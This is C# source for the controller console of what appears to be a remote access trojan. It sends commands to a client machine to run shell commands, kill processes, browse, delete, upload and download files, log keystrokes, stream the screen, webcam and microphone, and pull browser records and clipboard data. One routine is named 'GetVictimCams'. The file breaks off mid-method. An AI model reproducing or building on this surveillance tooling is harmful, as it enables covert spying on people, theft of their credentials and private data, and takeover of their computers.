using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using NAudio.Wave;
using System.Data;
using System.Collections;
using System.Media;
using System.Net.NetworkInformation;
using System.Windows.Forms.DataVisualization.Charting;
using System.Diagnostics;

namespace RemoteServer
{
    public partial class Controller : Form
    {
        private string key;
        private string currentNode = "";
        public delegate void SetTextCallback(string s);
        private WaveOut waveout;
        private List<Bitmap> images = null;
        private MovieMaker moviemaker;
        private BufferedWaveProvider provider;
        private List<object> clipboard = new List<object>();
        private string host;
        private TransferRate tr;
        bool redirect = false;

        #region Constructors
        public Controller(string key, string host)
        {
            InitializeComponent();
            button2.Enabled = false;
            button6.Enabled = false;
            button8.Enabled = false;
            button11.Enabled = false;
            label9.Text = trackBar1.Value.ToString();
            this.key = key;
            this.host = host;
        }
        #endregion

        private void refreshPing()
        {
            float value = float.Parse(PingClient().ToString());
            if (value > pingGauge.MaxValue)
                value = pingGauge.MaxValue;
                
                pingGauge.Value = value;
        }

        private void SetChatText(string text)
        {
            if (this.richTextBox3.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetChatText);
                this.Invoke(d, new object[] { text });
            }
            else
            {
                this.richTextBox3.SelectionColor = Color.DarkGray;
                this.richTextBox3.SelectedText = text + "\n";
                this.richTextBox3.SelectionStart = this.richTextBox3.Text.Length;
                this.richTextBox3.ScrollToCaret();
            }
        }

        private void SetText(string text)
        {
            try
            {
                if (!redirect)
                {
                    if (this.rtbChat.InvokeRequired)
                    {
                        SetTextCallback d = new SetTextCallback(SetText);
                        this.Invoke(d, new object[] { text });
                    }
                    else
                    {
                        this.rtbChat.SelectionColor = Color.DarkGray;
                        this.rtbChat.SelectedText = text;
                        this.rtbChat.SelectionStart = this.rtbChat.Text.Length;
                        this.rtbChat.ScrollToCaret();
                    }
                }
                else
                {
                    if (this.richTextBox4.InvokeRequired)
                    {
                        SetTextCallback d = new SetTextCallback(SetText);
                        this.Invoke(d, new object[] { text });
                    }
                    else
                    {
                        richTextBox4.SelectedText = text;
                        redirect = false;
                    }
                }
            }
            catch
            {
                MessageBox.Show(text);
            }
        }

        private void SetActivityLogText(string text)
        {
            if (this.richTextBox1.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetActivityLogText);
                this.Invoke(d, new object[] { text });
            }
            else
            {
                this.richTextBox1.SelectionColor = Color.DarkGray;
                this.richTextBox1.SelectedText = text + "\n";
                this.richTextBox1.SelectionStart = this.richTextBox1.Text.Length;
                this.richTextBox1.ScrollToCaret();
            }
        }

        private void SetKeyLogText(string text)
        {
            if (this.richTextBox2.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetKeyLogText);
                try
                {
                    this.Invoke(d, new object[]
                    { 
                        text 
                    });
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else
            {
                this.richTextBox2.SelectionColor = Color.DarkGray;
                this.richTextBox2.SelectedText = text;
                this.richTextBox2.SelectionStart = this.richTextBox2.Text.Length;
                this.richTextBox2.ScrollToCaret();
            }
        }

        private void txtMessage_KeyDown(object sender, KeyEventArgs e)
        {
            if (Keys.Enter == e.KeyCode)
            {
                if (txtMessage.Text == "cls" || txtMessage.Text == "clear")
                {
                    txtMessage.Text = "";
                    rtbChat.Clear();
                }
                else
                {
                    if (txtMessage.Text != "")
                    {
                        issueCommand(txtMessage.Text);

                        rtbChat.SelectionColor = Color.IndianRed;
                        SetText("Command >> " + txtMessage.Text + "\n");
                        txtMessage.Text = "";
                    }
                }
            }
        }

        private void issueCommand(string comm)
        {
            var o = new global::DataObject
            {
                CommandName = comm,
                CommandType = "CMD"
            };

            SendMessage(o);
        }

        public void onNewMessageBroadCast(object sender, Message message)
        {
            if(key.Equals(message.Key))
            {
                if (message.Data != null)
                {
                    if (Type.GetType(message.Data.ToString()) == typeof(TransferRate))
                    {
                        tr = (TransferRate)message.Data;
                        if (tr.Rate > socketGauge.MaxValue)
                            socketGauge.Value = socketGauge.MaxValue;
                        else
                            socketGauge.Value = tr.Rate;
                    }
                    else
                        initProcess(message.Data);
                } 
            }
        }

        public void SendMessage(object msg)
        {
            Myserver.SendMessage(msg, key);
        }
     
        private void initProcess(Object obj)
        {
            Thread t = new Thread(new ParameterizedThreadStart(ProcessCommand));
            t.IsBackground = true;
            t.Start(obj);
        }

        private void ProcessCommand(object ob)
        {
            var o = (global::DataObject) ob;
            if (o.CommandType == "TSKMGR")
            {
                if (o.CommandName == "PROC")
                {
                    var data = (List<string[]>)o.CommandData;
                    UpdataTaskManager(data);
                }
            }
            else if (o.CommandType == "CMD")
            {
                var r = (string)o.CommandData;
                SetText(r);
            }
            else if (o.CommandType == "SRCH")
            {
                if (o.CommandName == "FF")
                {
                    try
                    {
                        CreateResultsListItem((FileSystemInfo)o.CommandData);
                    }
                    catch (Exception ex)
                    {
                    } 
                }
                else if (o.CommandName == "END")
                {
                    this.Invoke(new Action(EnableButtons));
                    this.Invoke(new Action(() => MessageBox.Show(this, (string)o.CommandData, @"Information", MessageBoxButtons.OK,
                         MessageBoxIcon.Information)));
                }
                else if (o.CommandName == "EEND")
                {
                    this.Invoke(new Action(EnableButtons));
                    this.Invoke(new Action(() => MessageBox.Show(this, (string)o.CommandData, @"Information", MessageBoxButtons.OK,
                         MessageBoxIcon.Information)));
                }
            }
            else if (o.CommandType == "RTL")
            {
                if (o.CommandName == "RTAUPD")
                {
                    SetActivityLogText((string)o.CommandData);
                }
                else if (o.CommandName == "RTKL")
                {
                    SetKeyLogText(o.CommandData.ToString());
                }
            }
            else if (o.CommandType == "EXPLORER")
            {
                if (o.CommandName == "LOAD")
                {
                    this.Invoke(new Action(() => LoadExplorer(o.CommandData)));
                    
                }
                else if (o.CommandName == "SUBNODE")
                {
                    this.Invoke(new Action(() => UpdateTreeNode(o.CommandData)));
                }
                else if(o.CommandName == "FILES")
                {
                    this.Invoke(new Action(() => UpdateFileListView(o.CommandData)));
                }
                else if (o.CommandName == "DELFILE")
                {
                    this.Invoke(new Action(() => DeleteFile(o.CommandData)));
                }
            }
            else if (o.CommandType == "ScreenShoot")
            {
                if (o.CommandName == "Update")
                {
                    this.Invoke(new Action(() => ScreenShoot(o.CommandData)));
                }
            }
            else if (o.CommandType == "Chat")
            {
                if (o.CommandName == "Message")
                {
                    SetChatText((string)o.CommandData);
                }
            }
            else if (o.CommandType == "Webcam")
            {
                if (o.CommandName == "Update")
                {
                    this.Invoke(new Action(() => CamShoot(o.CommandData)));
                }
                else if (o.CommandName == "List")
                {
                    this.Invoke(new Action(() => FillComboBox(o.CommandData, ref comboBox1)));
                }
            }
            else if(o.CommandType=="MessageBox")
            {
                if(o.CommandName=="Result")
                {
                    this.Invoke(new Action(() => MessageResult(o.CommandData)));
                }
                else
                {
                    this.Invoke(new Action(() => MessageResult((string)o.CommandData, o.CommandName)));
                }
            }
            else if (o.CommandType == "LogBook")
            {
                this.Invoke(new Action(() => LogBook(o.CommandData)));
            }
            else if (o.CommandType == "Mic")
            {
                if (o.CommandName == "List")
                {
                    this.Invoke(new Action(() => FillComboBox(o.CommandData, ref comboBox3)));
                }
                else if (o.CommandName == "Update")
                {
                    this.Invoke(new Action(() => PlayVoice(o.CommandData)));
                }
                else if (o.CommandName == "provider")
                {
                    this.Invoke(new Action(() => InitProvider(o.CommandData)));
                }
            }
            else if(o.CommandType=="Browsers")
            {
                if(o.CommandName=="result")
                {
                    this.Invoke(new Action(() => Browsers(o.CommandData)));
                }
                else if(o.CommandName=="list")
                {
                    this.Invoke(new Action(() => FillComboBox(o.CommandData, ref comboBox4)));
                }
            }
            else if (o.CommandType == "Self")
            {
                if (o.CommandName == "result")
                {
                    this.Invoke(new Action(() => SelfResult(o.CommandData)));
                }
            }
            else if (o.CommandType == "Clipboard")
            {
                if (o.CommandName == "data")
                {
                    this.Invoke(new Action(() => AddtoClipBoard(o.CommandData)));
                }
            }
            else if (o.CommandType == "Device")
            {
                if (o.CommandName == "notify")
                {
                    this.Invoke(new Action(() => AddtoDevice(o.CommandData)));
                }
            }
        }

        private void InitProvider(object o)
        {
            int[] bt = (int[])o;
            try
            {
                WaveFormat format = new WaveFormat(bt[0], bt[2], bt[1]);
                provider = new BufferedWaveProvider(format);
                waveout = new WaveOut(Handle);
     
                waveout.DesiredLatency = 100;
                waveout.Init(provider);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void Browsers(object o)
        {
            DataTable bt = (DataTable)o;
            Text = "Record Found : " + bt.Rows.Count.ToString();
            try
            {
               dataGridView1.DataSource = bt;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void ScreenShoot(object o)
        {
            byte[] buffer = (byte[]) o;
            try
            {
                if (buffer != null)
                    pictureBox1.BackgroundImage = Image.FromStream(new MemoryStream(buffer));
                else
                    Text = "No Screenshots";

                if (button29.Text.Contains("Stop"))
                    images.Add(new Bitmap(pictureBox1.BackgroundImage));
            }
            catch (Exception ex)
            {
                Text= ex.Message;
            }
        }

        private void PlayVoice(object o)
        {
            object[]  obj = (object[])o;
            byte[] bytes = (byte[])obj[0];
            int cnt = (int)obj[1];

            try
            {
                if (provider != null)
                    provider.AddSamples(bytes, 0, cnt);
            }
            catch (Exception ex)
            {
                Text = ex.Message;
            }
        }

        private void MessageResult(object o)
        {
            string buffer = (string)o;
            try
            {
                label7.Text = "Message Result : " + buffer;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void MessageResult(string message, string type)
        {
            try
            {
                if (type == "Information")
                    MessageBox.Show(message, type, MessageBoxButtons.OK, MessageBoxIcon.Information);
                else
                    MessageBox.Show(message, type, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void SelfResult(object o)
        {
            string buffer = (string)o;
            try
            {
                textBox6.Text += buffer + Environment.NewLine;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void LogBook(object o)
        {
            string buffer = (string)o;
            try
            {
                if (Visible)
                {
                    textBox5.Text += buffer + Environment.NewLine + "* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *" + Environment.NewLine;
                    Error();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void FillComboBox(object o, ref ComboBox cb)
        {
            string[] buffer = (string[])o;
            try
            {
                cb.Items.Clear();
                foreach (string s in buffer)
                {
                    cb.Items.Add(s);
                }

                if (cb.Items.Count > 0)
                    cb.SelectedIndex = 0;
                else
                {
                    cb.Items.Add("Bad News For You!");
                    cb.SelectedIndex = 0;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void CamShoot(object o)
        {
            byte[] buffer = (byte[])o;
            try
            {
                pictureBox2.Image = Image.FromStream(new MemoryStream(buffer));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void DeleteFile(object o)
        {
            object[] ob = (object[])o;
            if ((bool)ob[1])
            {
                string file = Path.GetFileName((string)ob[0]);
                MessageBox.Show("The File " + file + " Deleted Successfully", "Information", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                if (file != null)
                {
                    ListViewItem i = lstClientFiles.FindItemWithText(file);
                    lstClientFiles.Items.Remove(i);
                }
            }
        }

        private void UpdateFileListView(object o)
        {
            object[] ob = (object[])o;
            if (ob != null)
            {
                ListViewItem[] files = (ListViewItem[])ob[0];
                lstClientFiles.SmallImageList = IconsToImageList((Icon[])ob[1]);
                lstClientFiles.BeginUpdate();
                lstClientFiles.Items.Clear();
                lstClientFiles.Items.AddRange(files);
                lstClientFiles.EndUpdate();
            }
            else
                MessageBox.Show("No Files Found!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private ImageList IconsToImageList(Icon[] icons)
        {
            ImageList imgList = new ImageList();
            for (int i = 0; i < icons.Length; i++)
            {
                imgList.Images.Add(i.ToString(), icons[i]);
            }
            return imgList;
        }

        private void LoadExplorer(object o)
        {
            TreeNode n = (TreeNode)o;

            treeView1.Nodes.Add(n);
            treeView1.SelectedNode = n;
            treeView1.SelectedNode.Expand();
        }

        private void UpdateTreeNode(object o)
        {
            TreeNode n = (TreeNode) o;
            TreeNode[] data = new TreeNode[n.Nodes.Count];          
            n.Nodes.CopyTo(data,0);
            treeView1.BeginUpdate();
            treeView1.SelectedNode.Nodes.Clear();
            treeView1.SelectedNode.Nodes.AddRange(data);
            treeView1.EndUpdate();
        }

        private void UpdataTaskManager(List<string[]> procs)
        {
            this.Invoke(new Action(() => lvprocesslist.BeginUpdate()));
            ClearProcess();
            foreach (var process in procs)
            {
                string[] p = process;
                var proc = new ListViewItem(p);
                UpdateProcess(proc);
            }
            this.Invoke(new Action(() => lvprocesslist.EndUpdate()));
        }

        public static String GetBytesStringKB(Int64 bytesCount)
        {
            Int64 bytesShow = (bytesCount + 1023) >> 10;
            String bytesString = GetPointString(bytesShow) + " KB";
            return bytesString;
        }

        public static String GetPointString(Int64 value)
        {
            String pointString = value.ToString();

            Int32 i = 3;
            while (pointString.Length > i)
            {
                pointString = pointString.Substring(0, pointString.Length - i) + "." + pointString.Substring(pointString.Length - i, i);
                i += 4;
            }

            return pointString;
        }

        private void CreateResultsListItem(FileSystemInfo info)
        {
            ListViewItem lvi = new ListViewItem();
            lvi.Text = info.FullName;

            ListViewItem.ListViewSubItem lvsi = new ListViewItem.ListViewSubItem();
            if (info is FileInfo)
            {
                lvsi.Text = GetBytesStringKB(((FileInfo)info).Length);
            }
            else
            {
                lvsi.Text = "";
            }
            lvi.SubItems.Add(lvsi);

            lvsi = new ListViewItem.ListViewSubItem();
            lvsi.Text = info.LastWriteTime.ToShortDateString() + " " + info.LastWriteTime.ToShortTimeString();
            lvi.SubItems.Add(lvsi);
            lvi.ToolTipText = info.FullName;
            UpdateFileFound(lvi);
        }

        private void UpdateFileFound(ListViewItem file)
        {
            if (this.resultsList.InvokeRequired)
            {
                resultsList.Invoke(new Action(() => resultsList.Items.Add(file)));
            }
        }

        private void ClearProcess()
        {
            if (this.lvprocesslist.InvokeRequired)
            {
                lvprocesslist.Invoke(new Action(() => lvprocesslist.Items.Clear()));
            }
        }

        private void UpdateProcess(ListViewItem proc)
        {
            if (this.lvprocesslist.InvokeRequired)
            {
                lvprocesslist.Invoke(new Action(() =>  lvprocesslist.Items.Add(proc)));
            }
        }

        private void GetTreeViewDirectory()
        {
            SendMessage(new global::DataObject{CommandType = "EXPLORER",CommandName = "LOAD"});
        }

        #region Menu Commands
        /// <summary>
        /// Exit Event Handler. Exit menu item is selected, the dialog box is hidden from user.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Hide(); 
        }
        
        /// <summary>
        /// Event Called when Controller Dialog Box is Closed by user. Same as exit event of Menu
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void controller_FormClosing(Object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;  
            this.Hide();

        }
        #endregion

        private void menuItem9_Click(object sender, EventArgs e)
        {
            if (lvprocesslist.SelectedItems.Count >= 1)
            {
                try
                {
                    int selectedpid = Convert.ToInt32(lvprocesslist.SelectedItems[0].SubItems[1].Text.ToString());
                    
                    SendMessage(new global::DataObject{CommandType = "TSKMGR",CommandName = "KILL",CommandData = selectedpid});
                    lvprocesslist.SelectedItems[0].Remove();
                }
                catch(Exception ex)
                {
                    Debug.WriteLine(ex.Message, "Error");
                }
            }
        }

        private void startButton_Click(object sender, EventArgs e)
        {
            resultsList.Items.Clear();

            String fileNamesString = fileNameTextBox.Text;
            String[] fileNames = fileNamesString.Split(new Char[] { ';' });
            List<String> validFileNames = new List<String>();
            foreach (String fileName in fileNames)
            {
                String trimmedFileName = fileName.Trim();
                if (trimmedFileName != "")
                {
                    validFileNames.Add(trimmedFileName);
                }
            }

            Encoding encoding = asciiRadioButton.Checked ? Encoding.ASCII : Encoding.Unicode;

            SearcherParams pars = new SearcherParams(searchDirTextBox.Text.Trim(),
                                                        includeSubDirsCheckBox.Checked,
                                                        validFileNames,
                                                        newerThanCheckBox.Checked,
                                                        newerThanDateTimePicker.Value,
                                                        olderThanCheckBox.Checked,
                                                        olderThanDateTimePicker.Value,
                                                        containingCheckBox.Checked,
                                                        containingTextBox.Text.Trim(),
                                                        encoding);
            SendMessage(new global::DataObject{CommandType = "SRCH",CommandName = "START",CommandData = pars});
            DisableButtons(); 
        }

        private void newerThanCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (newerThanCheckBox.Checked)
            {
                newerThanDateTimePicker.Enabled = true;
            }
            else
            {
                newerThanDateTimePicker.Enabled = false;
            }
        }

        private void olderThanCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (olderThanCheckBox.Checked)
            {
                olderThanDateTimePicker.Enabled = true;
            }
            else
            {
                olderThanDateTimePicker.Enabled = false;
            }
        }

        private void containingCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (containingCheckBox.Checked)
            {
                containingTextBox.Enabled = true;
                asciiRadioButton.Enabled = true;
                unicodeRadioButton.Enabled = true;
            }
            else
            {
                containingTextBox.Enabled = false;
                asciiRadioButton.Enabled = false;
                unicodeRadioButton.Enabled = false;
            }
        }

        private void writeResultsButton_Click(object sender, EventArgs e)
        {
            SaveFileDialog dlg = new SaveFileDialog();
            dlg.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
            dlg.FilterIndex = 1;
            dlg.FileName = "";
            if (dlg.ShowDialog(this) == DialogResult.OK)
            {

                try
                {
                    FileStream fs = new FileStream(dlg.FileName, FileMode.Create, FileAccess.Write);
                    StreamWriter sw = new StreamWriter(fs);

                    String delimeter = delimeterTextBox.Text.Replace("\\r", "\r").Replace("\\n", "\n").Replace("\\t", "\t");

                    bool bFirstHdr = true;
                    foreach (ColumnHeader hdr in resultsList.Columns)
                    {
                        if (bFirstHdr)
                        {
                            bFirstHdr = false;
                            sw.Write(hdr.Text + ":");
                        }
                        else
                        {
                            sw.Write(delimeter + hdr.Text + ":");
                        }
                    }
                    sw.WriteLine();

                    foreach (ListViewItem lvi in resultsList.Items)
                    {
                        bool bFirstLvsi = true;
                        foreach (ListViewItem.ListViewSubItem lvsi in lvi.SubItems)
                        {
                            if (bFirstLvsi)
                            {
                                bFirstLvsi = false;
                                sw.Write(lvsi.Text);
                            }
                            else
                            {
                                sw.Write(delimeter + lvsi.Text);
                            }
                        }
                        sw.WriteLine();
                    }

                    sw.Close();
                    fs.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
            }
        }

        private void EnableButtons()
        {
            searchDirTextBox.Enabled = true;
            selectSearchDirButton.Enabled = true;
            includeSubDirsCheckBox.Enabled = true;
            fileNameTextBox.Enabled = true;
            newerThanCheckBox.Enabled = true;
            if (newerThanCheckBox.Checked)
            {
                newerThanDateTimePicker.Enabled = true;
            }
            olderThanCheckBox.Enabled = true;
            if (olderThanCheckBox.Checked)
            {
                olderThanDateTimePicker.Enabled = true;
            }
            containingCheckBox.Enabled = true;
            if (containingCheckBox.Checked)
            {
                containingTextBox.Enabled = true;
                asciiRadioButton.Enabled = true;
                unicodeRadioButton.Enabled = true;
            }
            stopButton.Enabled = false;
            startButton.Enabled = true;
            delimeterTextBox.Enabled = true;
            writeResultsButton.Enabled = true;
        }

        private void DisableButtons()
        {
            searchDirTextBox.Enabled = false;
            selectSearchDirButton.Enabled = false;
            includeSubDirsCheckBox.Enabled = false;
            fileNameTextBox.Enabled = false;
            newerThanCheckBox.Enabled = false;
            newerThanDateTimePicker.Enabled = false;
            olderThanCheckBox.Enabled = false;
            olderThanDateTimePicker.Enabled = false;
            containingCheckBox.Enabled = false;
            containingTextBox.Enabled = false;
            asciiRadioButton.Enabled = false;
            unicodeRadioButton.Enabled = false;
            stopButton.Enabled = true;
            startButton.Enabled = false;
            delimeterTextBox.Enabled = false;
            writeResultsButton.Enabled = false;
        }

        private void stopButton_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject { CommandType = "SRCH", CommandName = "STOP" });
        }

        private void TaskManager()
        {
            SendMessage(new global::DataObject { CommandType = "TSKMGR", CommandName = "UPD" });
        }

        private void tmTimer_Tick(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject { CommandType = "TSKMGR", CommandName = "UPD" });
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject{CommandType = "RTL", CommandName = "RTASTART"});
            button1.Enabled = false;
            button2.Enabled = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject { CommandType = "RTL", CommandName = "RTASTOP" });
            button2.Enabled = false;
            button1.Enabled = true;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject { CommandType = "RTL", CommandName = "RTKLSTART" });
            button5.Enabled = false;
            button6.Enabled = true;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject { CommandType = "RTL", CommandName = "RTKLSTOP" });
            button6.Enabled = false;
            button5.Enabled = true;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            SaveFileDialog dlg = new SaveFileDialog();
            dlg.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
            dlg.FilterIndex = 1;
            dlg.FileName = "";
            if (dlg.ShowDialog(this) == DialogResult.OK)
            {
                richTextBox1.SaveFile(dlg.FileName,RichTextBoxStreamType.PlainText);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            SaveFileDialog dlg = new SaveFileDialog();
            dlg.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
            dlg.FilterIndex = 1;
            dlg.FileName = "";
            if (dlg.ShowDialog(this) == DialogResult.OK)
            {
                richTextBox1.SaveFile(dlg.FileName, RichTextBoxStreamType.PlainText);
            }
        }

        private void treeView1_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node.Text != "Desktop" && currentNode != e.Node.Text)
            {
                currentNode = e.Node.Text;
                treeView1.SelectedNode = e.Node;

                SendMessage(new global::DataObject
                {
                    CommandType = "EXPLORER",
                    CommandName = "GETSUBDIR",
                    CommandData = e.Node
                });
            }
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (!e.Node.Tag.ToString().Equals("My Computer"))
                SendMessage(new global::DataObject
                {
                    CommandType = "EXPLORER",
                    CommandName = "GETFILES",
                    CommandData = e.Node.Tag
                });
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClientFiles.SelectedItems.Count > 0)
            {
                String path = treeView1.SelectedNode.Tag.ToString() + "\\" +lstClientFiles.SelectedItems[0].Text;
                SendMessage(new global::DataObject
                {
                    CommandType = "EXPLORER",
                    CommandName = "DELFILE",
                    CommandData = path
                });
            }
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClientFiles.SelectedItems.Count > 0)
            {
                String path = treeView1.SelectedNode.Tag.ToString() + "\\" + lstClientFiles.SelectedItems[0].Text;
                SendMessage(new global::DataObject
                {
                    CommandType = "EXPLORER",
                    CommandName = "OPENFILE",
                    CommandData = path
                });
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClientFiles.SelectedItems.Count > 0)
            {
                string path = treeView1.SelectedNode.Tag.ToString() + "\\" + lstClientFiles.SelectedItems[0].Text;
                saveFileDialog1.FileName = lstClientFiles.SelectedItems[0].Text;
                string ext = lstClientFiles.SelectedItems[0].Text.Split('.').Last();

                saveFileDialog1.Filter = GetFileType(ext) + " (*." + ext + ")|*." + ext;
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "EXPLORER",
                        CommandName = "DOWNLOADFILE",
                        CommandData = path
                    });
                }      
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = treeView1.SelectedNode.Tag.ToString();
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "FILE",
                    CommandData = new object[]{path , new FileInfo(openFileDialog1.FileName)}
                });
              //  SendFile(openFileDialog1.FileName);
                if (!path.Equals("My Computer"))
                {
                    SendMessage(new global::DataObject
                    {
                        CommandType = "EXPLORER",
                        CommandName = "GETFILES",
                        CommandData = path
                    });
                }
            }
        }

        private string GetFileType(string ext)
        {
            RegistryKey rKey = null;
            RegistryKey sKey = null;
            string FileType = "";
            try
            {
                rKey = Registry.ClassesRoot;
                sKey = rKey.OpenSubKey(ext);
                if (sKey != null && (string)sKey.GetValue("", ext) != ext)
                {
                    sKey = rKey.OpenSubKey((string)sKey.GetValue("", ext));
                    FileType = (string)sKey.GetValue("");
                }
                else
                    FileType = ext.Substring(ext.LastIndexOf('.') + 1).ToUpper() + " File";
                return FileType;
            }
            finally
            {
                if (sKey != null) sKey.Close();
                if (rKey != null) rKey.Close();
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "ScreenShoot",
                CommandName = "Start",
                CommandData = trackBar1.Value
            });
            button7.Enabled = false;
            button8.Enabled = true;
        }

        private void button8_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "ScreenShoot",
                CommandName = "Stop"
            });
            button8.Enabled = false;
            button7.Enabled = true;
            pictureBox1.Image = null;
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            label9.Text = trackBar1.Value + "%";
            SendMessage(new global::DataObject
            {
                CommandType = "Webcam",
                CommandName = "depth",
                CommandData = trackBar1.Value
            });
        }

        private void button10_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Chat",
                CommandName = "Start"
            });
            button10.Enabled = false;
            button11.Enabled = true;
        }

        private void button11_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Chat",
                CommandName = "Stop"
            });
            button11.Enabled = false;
            button10.Enabled = true;
        }

        private void button12_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Chat",
                CommandName = "Message",
                CommandData = textBox2.Text
            });
            textBox2.Text = "";
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "Chat",
                    CommandName = "Message",
                    CommandData = textBox2.Text
                });
                textBox2.Text = "";
            }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            (new MyAboutBox()).ShowDialog(); 
        }

        private void button14_Click(object sender, EventArgs e)
        {
            richTextBox3.Text = "";
        }

        private void button19_Click(object sender, EventArgs e)
        {
            GetVictimCams();
        }

        private void GetVictimCams()
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Webcam",
                CommandName = "List"
            });
        }

        private void addDeviceStatus(object data)
        {
            dataGridView3.Rows.Add();

            int count = dataGridView3.Rows.Count + 1;
            DateTime dt = DateTime.Now;

            List<string> info = (List<string>)data;
            string[] dev = new string[7];
            dev[0] = count.ToString();
            dev[6] = dt.ToLongTimeString();

            count = 1;

            foreach (string s in info)
            {
                dev[count] = s;
                count++;
            }

            dataGridView3.Rows.Add(dev);
        }

        private void button16_Click(object sender, EventArgs e)
        {
            SendMessage(new global::DataObject
            {
                CommandType = "Webcam",
                CommandName = "choose",
                CommandData=comboBox1.SelectedIndex
            });
        }

        bool cam = false;
        private void button15_Click(object sender, EventArgs e)
        {
            if (!cam)
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "Webcam",
                    CommandName = "Start"
                });
                cam = true;
                button15.Text = "Stop Stream";
            }
            else
            {
                SendMessage(new global::DataObject
                {
                    CommandType = "Webcam",
                    CommandName = "Stop"
                });
                cam = false;
                button15.Text = "Start Stream";
            }
        }

        private void button18_Click(object sender, EventArgs e)
        {
            pictureBox2.Image.Save(Environment.CurrentDirectory + "\\Screenshots\\" + DateTime.Now.ToString("yyyyMMddHHmmssfff") + ".jpg");
        }

        private long PingClient() 
        {
            long timeout = -1;
            try
            {
                Ping pinger = new Ping();
                PingReply reply = pinger.Send(host);
                if (reply != null)
                {
                    if (reply.Status == IPStatus.Success)
                        timeout = reply.RoundtripTime;
                }
            }
            catch
            {
                //Do nothing
            }

            return timeout;
        }

        private void Controller_Load(object sender, EventArgs e)
        {
            if (!IsHandleCreated)
            {
                CreateHandle();
            }

            comboBox2.SelectedIndex = 0;
            Myserver.onNewMessageArrived += new Myserver.onNewMessageBroadcast(onNewMessageBroadCast);
            //timer_ping.Start();
            //timer_graph.Start();
        }

        private void button17_Click(object sender, EventArgs e)
        {
            if (textBox3.Text != null && textBox3.Text != "")
            {
                string[] data = new string[3];
                data[0] = textBox3.Text;
                data[1] = textBox4.Text;
                data[2] = comboBox2.SelectedItem.ToString();

                SendMessage(new global::DataObject
                {
                    CommandType = "MessageBox",
                    CommandName = "show",
                    CommandData = data
                });

                textBox3.Text = "";
                MessageBox.Show("Message has been Sent to User!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
                MessageBox.Show("Please Write a Message to Show!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            textBox5.Text = "";
        }

        private void saveLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DialogResult rs = saveFileDialog1.ShowDialog();
